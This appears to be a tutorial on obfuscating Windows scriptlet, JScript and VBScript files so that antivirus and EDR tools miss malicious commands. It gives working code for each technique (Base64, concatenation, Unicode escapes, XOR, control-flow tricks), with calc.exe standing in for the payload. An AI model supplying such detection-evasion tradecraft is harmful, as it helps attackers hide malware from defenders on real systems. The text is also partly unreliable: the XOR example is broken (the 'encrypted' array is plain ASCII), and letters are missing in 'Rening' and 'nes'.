Obfuscating a **.sct** file or a **JScript/VBScript** file 

1. **String Encoding/Obfuscation**
2. **Variable Rening**
3. **Control Flow Obfuscation**
4. **String Concatenation**
5. **Unicode Obfuscation**
6. **Inline Script Decryption**
7. **Script Encoders (Third-Party Tools)**

### 1. **String Encoding/Obfuscation**
   - Replace plain text strings with encoded values that are decoded at runtime. This makes it harder for AV/EDR to identify malicious strings or commands directly.
   
#### Example: Base64 Encoding

For example, instead of having this plain VBScript code:
```vbscript
CreateObject("WScript.Shell").Run "calc.exe"
```

You can encode the string **`calc.exe`** in **Base64** and decode it at runtime:

```vbscript
Dim objShell
Set objShell = CreateObject("WScript.Shell")
Dim command
command = "Y2FsYy5leGU=" ' Base64-encoded calc.exe
objShell.Run Base64Decode(command)

Function Base64Decode(base64String)
    Dim xml
    Set xml = CreateObject("MSXML2.DOMDocument")
    xml.LoadXML "<root><binary>" & base64String & "</binary></root>"
    Base64Decode = xml.documentElement.selectSingleNode("binary").nodeTypedValue
End Function
```

This decodes the Base64 string and runs `calc.exe`. Similarly, you can encode malicious strings.

#### For JScript:

```js
var shell = new ActiveXObject("WScript.Shell");
var command = "Y2FsYy5leGU=";
shell.Run(Base64Decode(command));

function Base64Decode(base64) {
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    xml.loadXML("<root><binary>" + base64 + "</binary></root>");
    return xml.documentElement.selectSingleNode("binary").nodeTypedValue;
}
```

### 2. **Variable Rening**
   - Use meaningless or randomized variable nes to make the code harder to understand.

Before obfuscation (JScript):
```js
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
```

After obfuscation:
```js
var a = new ActiveXObject("WScript.Shell");
a.Run("calc.exe");
```

You can make this even more complex by using multiple levels of meaningless variables and operations.

### 3. **Control Flow Obfuscation**
   - Break the logical flow of the script into fragmented pieces using conditionals, loops, or jumps. This makes it harder to follow the execution flow of the script.

Before:
```js
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
```

After:
```js
var a = new ActiveXObject("WScript.Shell");
var b = Math.random() > 0.5 ? "calc" : "notepad";
var c = b + ".exe";
if (b == "calc") {
    a.Run(c);
}
```

### 4. **String Concatenation**
   - Break up sensitive strings like `calc.exe` into smaller parts and concatenate them at runtime.

For VBScript:
```vbscript
Dim shell
Set shell = CreateObject("WScript.Shell")
Dim cmd
cmd = "c" & "a" & "l" & "c" & "." & "e" & "x" & "e"
shell.Run cmd
```

For JScript:
```js
var shell = new ActiveXObject("WScript.Shell");
var cmd = "c" + "a" + "l" + "c" + "." + "e" + "x" + "e";
shell.Run(cmd);
```

### 5. **Unicode Obfuscation**
   - Convert strings into **Unicode escape sequences** to make them less readable.

For example, instead of:
```js
shell.Run("calc.exe");
```

You can use:
```js
shell.Run("\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065");
```

This way, the string `calc.exe` is represented by its Unicode escape codes, making it harder to recognize in the code.

### 6. **Inline Script Decryption**
   - Encrypt the entire payload or sensitive parts of it, then decrypt it at runtime.

For example, you can XOR the script content and then decrypt it at runtime in the same script.

Before obfuscation:
```js
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe");
```

After obfuscation (using simple XOR encryption for the payload):
```js
var shell = new ActiveXObject("WScript.Shell");
var encrypted = [99, 97, 108, 99, 46, 101, 120, 101]; // XOR encrypted "calc.exe"
var key = 42;
var decrypted = "";
for (var i = 0; i < encrypted.length; i++) {
    decrypted += String.fromCharCode(encrypted[i] ^ key);
}
shell.Run(decrypted);
```

This decrypts and runs the payload at runtime.

### 7. **Script Encoders (Third-Party Tools)**
   - You can use third-party script obfuscation tools to automatically obfuscate JScript or VBScript. Some options include:
     - **JScrambler**: For JavaScript/JScript.
     - **VBScript Obfuscators**: There are a few online tools or downloadable programs that will obfuscate VBScript for you.
